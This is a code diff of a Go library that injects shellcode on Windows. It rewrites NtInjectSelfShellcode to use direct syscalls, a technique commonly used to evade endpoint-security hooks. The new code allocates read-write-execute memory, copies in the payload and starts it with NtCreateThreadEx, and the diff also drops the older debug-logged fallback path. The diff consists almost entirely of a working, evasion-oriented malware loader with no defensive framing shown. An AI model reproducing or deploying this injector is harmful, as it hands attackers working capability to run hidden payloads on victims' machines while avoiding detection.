@@ -1722,260 +1722,86 @@ NOTE: OriginalNtInjectSelfShellcode() contains the original implementation witho
 the memory compatibility layer, used as the fallback method.
 */
 func NtInjectSelfShellcode(shellcode []byte) error {
-	time.Sleep(1 * time.Second)
-	
-	// Debug: Check if shellcode pointer is valid
 	if len(shellcode) == 0 {
-		return fmt.Errorf("shellcode is empty")
+		return fmt.Errorf("empty shellcode :(")
+	}
+	currentProcess := GetCurrentProcessHandle()
+	var addr uintptr = 0
+	
+	shellcodeSize := uintptr(len(shellcode))
+	pageSize := uintptr(4096)
+	size := ((shellcodeSize + pageSize - 1) / pageSize) * pageSize
+
+	result, err := DirectSyscall("NtAllocateVirtualMemory",
+		currentProcess,                   
+		uintptr(unsafe.Pointer(&addr)),   
+		0,                                
+		uintptr(unsafe.Pointer(&size)),   
+		0x3000,                           
+		0x40)                             
+	
+	if result != 0 {
+		return fmt.Errorf("direct syscall failed: 0x%X, %v", result, err)
 	}
 	
-	debug.Printfln("WINAPI", "Debug: Shellcode length: %d, first byte: 0x%02X, ptr: %p\n", 
-		len(shellcode), shellcode[0], &shellcode[0])
-	
-	// First attempt: Try direct injection with original Go memory
-	debug.Printfln("WINAPI", "Attempting direct injection with Go memory\n")
-	result := OriginalNtInjectSelfShellcode(shellcode)
-	
-	// If direct injection succeeded, we're done
-	if result == nil {
-		debug.Printfln("WINAPI", "Direct injection succeeded!\n")
-		return nil
-	}
-	
-	// Fallback: Use "safe memory" workaround for compatibility
-	debug.Printfln("WINAPI", "Direct injection failed (%v), trying safe memory fallback\n", result)
-	
-	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
-	var sourceAddress uintptr
-	size := uintptr(len(shellcode))
-	
-	status, err := NtAllocateVirtualMemory(
-		currentProcess,
-		&sourceAddress,
-		0,
-		&size,
-		0x1000|0x2000, // MEM_COMMIT|MEM_RESERVE
-		0x04,          // PAGE_READWRITE
-	)
-	
-	if err != nil || status != 0 {
-		debug.Printfln("WINAPI", "Failed to allocate safe source memory: %v\n", err)
-		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
-	}
-	
-	// Copy shellcode to safe memory region
-	var bytesWritten uintptr
-	writeStatus, writeErr := NtWriteVirtualMemory(
-		currentProcess,
-		sourceAddress,
-		unsafe.Pointer(&shellcode[0]),
-		uintptr(len(shellcode)),
-		&bytesWritten,
-	)
-	
-	if writeErr != nil || writeStatus != 0 || bytesWritten != uintptr(len(shellcode)) {
-		debug.Printfln("WINAPI", "Failed to copy to safe memory: %v\n", writeErr)
-		// Cleanup and return original error
-		NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
-	}
-	
-	debug.Printfln("WINAPI", "Using safe memory fallback at: %p\n", unsafe.Pointer(sourceAddress))
-	
-	// Since write succeeded (status 0x0), proceed directly with protect and thread creation
-	// Change protection to RX
-	var oldProtect uintptr
-	protectStatus, protectErr := NtProtectVirtualMemory(
-		currentProcess,
-		&sourceAddress,
-		&size,
-		PAGE_EXECUTE_READ,
-		&oldProtect,
-	)
-	
-	if protectErr != nil || protectStatus != STATUS_SUCCESS {
-		debug.Printfln("WINAPI", "Failed to change protection on safe memory: %v\n", protectErr)
-		NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-		return fmt.Errorf("safe memory protection failed: %v %s", protectErr, FormatNTStatus(protectStatus))
-	}
-	
-	// Create thread using the safe memory
-	var hThread uintptr
-	threadStatus, threadErr := NtCreateThreadEx(
-		&hThread,
-		THREAD_ALL_ACCESS,
-		0,
-		currentProcess,
-		sourceAddress, // Use safe memory address directly
-		0,
-		0,
-		0,
-		0,
-		0,
-		0,
-	)
-	
-	if threadErr != nil || threadStatus != STATUS_SUCCESS {
-		debug.Printfln("WINAPI", "Failed to create thread with safe memory: %v\n", threadErr)
-		NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-		return fmt.Errorf("safe memory thread creation failed: %v %s", threadErr, FormatNTStatus(threadStatus))
-	}
-	
-	// Validate thread handle
-	if hThread == 0 {
-		NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-		return fmt.Errorf("safe memory thread creation returned invalid handle")
-	}
-	
-	debug.Printfln("WINAPI", "Thread created successfully: 0x%X\n", hThread)
-	
-	// Wait for thread to complete
-	debug.Printfln("WINAPI", "Waiting for thread to complete...\n")
-	timeout := TIMEOUT_10_SECONDS
-	
-	waitStatus, err := NtWaitForSingleObject(hThread, false, &timeout)
-	if err != nil {
-		debug.Printfln("WINAPI", "Warning: Wait failed: %v\n", err)
-	} else {
-		switch waitStatus {
-		case WAIT_OBJECT_0:
-			debug.Printfln("WINAPI", "Thread completed successfully\n")
-		case WAIT_TIMEOUT:
-			debug.Printfln("WINAPI", "Thread wait timed out after 10 seconds\n")
-		case WAIT_FAILED:
-			debug.Printfln("WINAPI", "Thread wait failed\n")
-		default:
-			debug.Printfln("WINAPI", "Thread wait completed with status: %s (0x%X)\n", FormatNTStatus(waitStatus), waitStatus)
+	if addr == 0 {
+		addr = 0x10000000
+		size = uintptr(4096)
+		
+		result, err = DirectSyscall("NtAllocateVirtualMemory",
+			currentProcess,
+			uintptr(unsafe.Pointer(&addr)),
+			0,
+			uintptr(unsafe.Pointer(&size)),
+			0x3000,
+			0x40)
+		
+		if result != 0 || addr == 0 {
+			return fmt.Errorf("both allocation attempts failed")
 		}
 	}
 	
-	// Close thread handle
-	closeStatus, closeErr := NtClose(hThread)
-	if closeErr != nil || closeStatus != STATUS_SUCCESS {
-		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", closeErr, FormatNTStatus(closeStatus))
-	} else {
-		debug.Printfln("WINAPI", "Thread handle closed successfully\n")
-	}
-	
-	// Cleanup safe memory
-	NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-	
-	debug.Printfln("WINAPI", "Safe memory fallback succeeded!\n")
-	return nil
-}
+	destSlice := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
+	copy(destSlice, shellcode)
 
-func OriginalNtInjectSelfShellcode(payload []byte) error {
-	if len(payload) == 0 {
-		return fmt.Errorf("payload is empty")
-	}
-	currentProcess := ^uintptr(0) // Use pseudo-handle for current process
 
-	// Step 1: Allocate RW memory
-	var baseAddress uintptr
-	size := uintptr(len(payload))
-
-	status, err := NtAllocateVirtualMemory(
-		currentProcess,
-		&baseAddress,
-		0,
-		&size,
-		MEM_COMMIT|MEM_RESERVE,
-		PAGE_READWRITE,
-	)
-	if err != nil || status != STATUS_SUCCESS {
-		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
-	}
-
-	// Step 2: Write shellcode using NtWriteVirtualMemory (safer than unsafe copy)
-	var bytesWritten uintptr
-	status, err = NtWriteVirtualMemory(
-		currentProcess,
-		baseAddress,
-		unsafe.Pointer(&payload[0]),
-		uintptr(len(payload)),
-		&bytesWritten,
-	)
-	if err != nil || status != STATUS_SUCCESS {
-		return fmt.Errorf("write failed: %v %s", err, FormatNTStatus(status))
-	}
-	if bytesWritten != uintptr(len(payload)) {
-		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
-	}
-	debug.Printfln("WINAPI", "Wrote %d bytes to self process\n", bytesWritten)
-
-	// Step 3: Change protection to RX
-	var oldProtect uintptr
-	status, err = NtProtectVirtualMemory(
-		currentProcess,
-		&baseAddress,
-		&size,
-		PAGE_EXECUTE_READ,
-		&oldProtect,
-	)
-	if err != nil || status != STATUS_SUCCESS {
-		return fmt.Errorf("protect failed: %v %s", err, FormatNTStatus(status))
-	}
-
-	// Step 4: Create thread using NtCreateThreadEx (true direct syscall)
 	var hThread uintptr
 	
-	// NtCreateThreadEx parameters:
-	// threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, arg, 
-	// createFlags, zeroBits, stackSize, maximumStackSize, attributeList
-	status, err = NtCreateThreadEx(
-		&hThread,                    // threadHandle - pointer to receive handle
-		THREAD_ALL_ACCESS,           // desiredAccess - full access to thread
-		0,                           // objectAttributes - NULL for basic usage
-		currentProcess,              // processHandle - current process pseudo-handle
-		baseAddress,                 // startAddress - our shellcode address
-		0,                           // arg - no parameter to pass
-		0,                           // createFlags - 0 = run immediately, 1 = create suspended
-		0,                           // zeroBits - 0 for default
-		0,                           // stackSize - 0 for default
-		0,                           // maximumStackSize - 0 for default
-		0,                           // attributeList - NULL for basic usage
-	)
+	result, err = DirectSyscall("NtCreateThreadEx",
+		uintptr(unsafe.Pointer(&hThread)), 
+		0x1FFFFF,                          
+		0,                                 
+		currentProcess,                    
+		addr,                              
+		0,                                 
+		0,                                 
+		0,                                 
+		0,                                 
+		0,                                 
+		0)                                 
 	
-	if err != nil || status != STATUS_SUCCESS {
-		return fmt.Errorf("NtCreateThreadEx failed: %v %s", err, FormatNTStatus(status))
+	
+	
+	if result != 0 || hThread == 0 {
+
+		DirectSyscall("NtFreeVirtualMemory", currentProcess, uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&size)), 0x8000)
+		return fmt.Errorf("thread creation failed: result=0x%X, handle=0x%X", result, hThread)
 	}
 
-	// Validate thread handle
-	if hThread == 0 {
-		return fmt.Errorf("NtCreateThreadEx returned invalid handle")
-	}
 
-	debug.Printfln("WINAPI", "Thread created successfully: 0x%X\n", hThread)
+	timeout := int64(-50000000)
+	DirectSyscall("NtWaitForSingleObject", hThread, 0, uintptr(unsafe.Pointer(&timeout)))
 	
-	// Wait for thread to complete execution
-	debug.Printfln("WINAPI", "Waiting for thread to complete...\n")
+
+	var exitCode uintptr
+	DirectSyscall("NtQueryInformationThread", hThread, 9, uintptr(unsafe.Pointer(&exitCode)), 8, 0)
 	
-	// Wait for the thread with a timeout (10 seconds relative timeout)
-	timeout := TIMEOUT_10_SECONDS
+
+
+	DirectSyscall("NtClose", hThread)
+	DirectSyscall("NtFreeVirtualMemory", currentProcess, uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&size)), 0x8000)
 	
-	waitStatus, err := NtWaitForSingleObject(hThread, false, &timeout)
-	if err != nil {
-		debug.Printfln("WINAPI", "Warning: Wait failed: %v\n", err)
-	} else {
-		switch waitStatus {
-		case WAIT_OBJECT_0:
-			debug.Printfln("WINAPI", "Thread completed successfully\n")
-		case WAIT_TIMEOUT:
-			debug.Printfln("WINAPI", "Thread wait timed out after 10 seconds\n")
-		case WAIT_FAILED:
-			debug.Printfln("WINAPI", "Thread wait failed\n")
-		default:
-			debug.Printfln("WINAPI", "Thread wait completed with status: %s (0x%X)\n", FormatNTStatus(waitStatus), waitStatus)
-		}
-	}
-	
-	// Close the thread handle
-	closeStatus, err := NtClose(hThread)
-	if err != nil || closeStatus != STATUS_SUCCESS {
-		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
-	} else {
-		debug.Printfln("WINAPI", "Thread handle closed successfully\n")
-	}
+
 	return nil
 }
 // NtInjectRemote injects shellcode into a remote process using direct syscalls ONLY
@@ -1984,10 +1810,10 @@ func OriginalNtInjectSelfShellcode(payload []byte) error {
 // payload: The shellcode bytes to inject
 func NtInjectRemote(processHandle uintptr, payload []byte) error {
 	if len(payload) == 0 {
-		return fmt.Errorf("payload is empty")
+		return fmt.Errorf("empty payload :(")
 	}
 	if processHandle == 0 {
-		return fmt.Errorf("invalid process handle")
+		return fmt.Errorf("invalid process handle :(")
 	}
 
 	debug.Printfln("WINAPI", "Starting remote injection into process handle 0x%X (%d bytes)\n", processHandle, len(payload))
